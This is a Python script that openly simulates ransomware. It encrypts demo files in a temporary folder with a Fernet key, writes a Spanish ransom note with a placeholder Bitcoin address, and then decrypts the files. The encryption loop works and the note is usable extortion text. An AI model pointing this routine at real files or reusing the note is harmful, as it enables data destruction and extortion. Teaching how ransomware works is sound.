import os
import time
import cryptography.fernet as fernet

'''
This script simulates ransomware behavior for educational purposes only.
It creates demo files, encrypts them, shows a ransom note, and then decrypts them.
'''


class RansomwareDemo:
    def __init__(self):
        self.target_folder = "/tmp/ransomware_demo/"
        self.key = fernet.Fernet.generate_key()
        self.cipher = fernet.Fernet(self.key)

    def create_demo_files(self):
        os.makedirs(self.target_folder, exist_ok=True)
        for i in range(5):
            with open(os.path.join(self.target_folder, f"file_{i}.txt"), "w") as f:
                f.write(f"This is a demo file number {i}.\n")
    
    def encrypt_files(self):
        print("Encrypting files...")
        
        for archive in os.listdir(self.target_folder):
            file_path = os.path.join(self.target_folder, archive)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            print(f"✓ Encrypted {archive}")
            time.sleep(1)

    def show_ransom_note(self):
        """Muestra el mensaje de rescate simulado"""
        mensaje = f"""
        ⚠️  ¡TUS ARCHIVOS HAN SIDO CIFRADOS! ⚠️
        
        Todos tus archivos importantes han sido cifrados con RSA-2048.
        
        Para recuperar tus archivos debes pagar 0.001 BTC a la dirección:
        bc1qdemostracionnoenviardinero
        
        Tu ID único: DEMO-{time.time()}
        
        Tu clave de descifrado: {self.key.decode()}
        """
        with open(os.path.join(self.target_folder, "LEE_PARA_RECUPERAR.txt"), 'w') as f:
            f.write(mensaje)
        
        print(mensaje)
    
    def decrypt_files(self):
        print("Decrypting files...")
        
        for archive in os.listdir(self.target_folder):
            if archive == "LEE_PARA_RECUPERAR.txt":
                continue
            file_path = os.path.join(self.target_folder, archive)
            with open(file_path, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = self.cipher.decrypt(encrypted_data)
            with open(file_path, "wb") as f:
                f.write(decrypted_data)
            print(f"✓ Decrypted {archive}")
            time.sleep(1)

if __name__ == "__main__":
    print("🚨 DEMOSTRACIÓN EDUCATIVA DE RANSOMWARE 🚨")
    print("ESTE CÓDIGO ES SOLO PARA PROPÓSITOS EDUCATIVOS\n")
    demo = RansomwareDemo()
    demo.create_demo_files()
    demo.encrypt_files()
    demo.show_ransom_note()
    
    input("Press Enter to decrypt files...")
    
    demo.decrypt_files()
    print("All files have been decrypted.")